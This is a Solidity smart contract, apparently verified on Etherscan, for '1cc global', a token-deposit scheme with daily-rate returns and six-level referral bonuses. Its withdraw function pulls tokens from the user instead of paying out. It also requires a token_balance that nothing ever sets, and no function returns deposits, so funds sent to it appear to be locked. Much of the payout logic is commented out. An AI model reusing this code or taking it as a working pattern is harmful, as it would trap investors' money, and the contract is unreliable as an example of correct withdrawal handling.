/**
 *Submitted for verification at Etherscan.io on 2021-03-17
*/

pragma solidity ^0.4.26;

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  constructor() public {
    owner = msg.sender;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  /**
   * @dev Allows the current owner to relinquish control of the contract.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

/*
* @title: 1cc global
* @desc: onecc global smart contract
*/
contract OneCCGlobal is Ownable{
    
    IERC20 public investToken;
    
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        uint256 period;
        uint256 expire;
    }

    struct Player {
        address referral;
        uint256 token_balance;
        uint256 eth_balance;
        uint256 dividends;
        uint256 day_devidends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerDeposit crowd;
        uint8 is_shareholder;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address public owner;
    
    
    /* invest contract address and decimal */
    address public invest_token_address = 0x58548c2a07bf1d72104ca1834e945d92a74dcedf;
    uint256 public invest_token_decimal = 18;

    uint8 constant public investment_days = 10;
    uint256 constant public investment_perc = 1800;

    uint256 public total_investors;
    uint256 public total_invested;
    uint256 public total_withdrawn;
    uint256 public total_referral_bonus;
    
    /* Current corwded shareholder number */
    uint256 public total_crowded_num; 
    
    /* Total shareholder join number */
    uint256 constant public total_shareholder_num = 30; 
    
    
    uint256 constant public soft_release = 1615600800;
    uint256 constant public full_release = 1615608000;

    /* Referral bonuses data  define*/
    uint8[] public referral_gens = [1,2,3,4,5,6];
    uint8[] public referral_bonuses = [10,8,6,4,2,1];
    
    
    //loan period and profit parameter define
    uint256[] public invest_period_months =    [1,  2,  3,  6,   12];   //month
    uint256[] public invest_period_day_rates = [30, 35, 40, 45,  50];   //Ten thousand of
    
    // 1cc (10 coin) cny price
    uint8 public invest_10_1cc_cny_price = 65;
    uint8 public invest_reward_eth_rate = 5;   //invest reward eth rate (%)
    
    //invest amount limit define
    uint256 constant public invest_min_amount = 100;
    uint256 constant public invest_max_amount = 10000;

    //user data list define
    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount, uint256 month);
    event Withdraw(address indexed addr, uint256 amount);
    event WithdrawEth(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount, uint8 month);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    
    constructor() public {
        
        owner = msg.sender;
        
        /* Create invest token instace  */
        investToken = IERC20(invest_token_address);  
    }
    

    /*
    * desc: user do deposit action
    */
    function deposit(address _referral, uint256 _amount, uint256 _month) 
        external 
        payable 
    {
        
        require(uint256(block.timestamp) > soft_release, "Not launched");
        
        require(_amount >= invest_min_amount, "Minimal deposit: 100 1CC");
        require(_amount <= invest_max_amount, "Maxinum deposit: 10000 1CC");
        
        Player storage player = players[msg.sender];
        require(player.deposits.length < 2000, "Max 2000 deposits per address");

        /* Transfer msg sender user token to contract address */
        uint256 token_decimals = 10 ** invest_token_decimal;
        uint256 tokenAmount = _amount*token_decimals;
        //transferTokens(investToken, msg.sender, address(this), tokenAmount);
        
        require(investToken.transferFrom(msg.sender, address(this), tokenAmount), "transferFrom failed");


        _setReferral(msg.sender, _referral);
        
        /* get the period total time (total secones) */
        uint256 period_time = _month.mul(30).mul(86400);
        
        player.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            period: _month,
            expire:uint256(block.timestamp).add(period_time)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += _amount;
        total_invested += _amount;

        //_referralPayout(msg.sender, _amount);

        //owner.transfer(msg.value.mul(20).div(100));
        
        
        emit Deposit(msg.sender, _amount, _month);
    }
    
    /*
    * @desc: user do withdraw action
    */
    function withdraw(uint256 _amount) payable external 
    {
        
        Player storage player = players[msg.sender];

        //_payout(msg.sender);

        require(player.token_balance > 0, "Zero amount");
        require(player.token_balance > _amount, "Insufficient balance in token account");
        
        //require(investToken.approve(address(msg.sender), 0), "approve failed");
        //require(investToken.approve(address(msg.sender), _amount), "approve failed");

        investToken.transferFrom(msg.sender, address(this), _amount);
        
        //uint256 amount = player.dividends + player.referral_bonus;
        //========== get50Percent
        //uint256 _25Percent = amount.mul(50).div(100);
        //uint256 amountLess25 = amount.sub(_25Percent);
        
        //autoReInvest(_25Percent);
        //player.dividends = 0;
        //player.referral_bonus = 0;
        
        player.token_balance -= _amount;
        
        player.total_withdrawn += _amount;
        total_withdrawn += _amount;

        //msg.sender.transfer(amountLess25);


        emit Withdraw(msg.sender, _amount);
    }


    /*
    * @desc: user auto reinvest in Withdraw
    */
    function autoReInvest(uint256 _amount,uint256 _month) private {
        Player storage player = players[msg.sender];
        
        /* get the period total time (total secones) */
        uint256 period_time = _month.mul(30).mul(86400);
        
        player.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            period:_month,
            expire:uint256(block.timestamp).add(period_time)
        }));

        player.total_invested += _amount;
        total_invested += _amount;
    }

    
    /*
    * @desc: update user referral data
    */
    function _setReferral(address _addr, address _referral) private {
        
        /* if user referral is not set */
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            /*
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
            */
        }
    }
    
    
    /*
    * @desc: user referral payout 
    */
    function _referralPayout(address _addr, uint256 _amount) private 
    {
        address ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 100;

            if(uint256(block.timestamp) < full_release){
                bonus = bonus * 2;
            }

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }


    function _payout(address _addr) private 
    {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    /*
    * @desc: update user total withdraw data
    */
    function _updateTotalPayout(address _addr) 
        private
    {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }
    
    /*
    * @desc: get day deposit profit
    */
    function payoutOf(address _addr) 
        view 
        external 
        returns(uint256 value) 
    {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    /*
    * @desc: get contract data info 
    */
    function contractInfo() 
        view 
        external 
        returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) 
    {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }
    
    /*
    * @desc: get user info
    */
    function userInfo(address _addr) 
        view 
        external 
        returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 total_deposits, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals) 
    {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals
        );
    }
    
    /*
    * @desc: get user investment list
    */
    function investmentsInfo(address _addr) 
        view 
        external 
        returns(uint256[] memory times, uint256[] memory amounts, uint256[] memory totalWithdraws,uint256[] memory endTimes) 
    {
        Player storage player = players[_addr];
        uint256[] memory _times = new uint256[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _times[i] = dep.time + investment_days * 86400;
          _endTimes[i] = dep.expire;
        }
        return (
          _times,
          _amounts,
          _totalWithdraws,
           _endTimes
        );
    }
}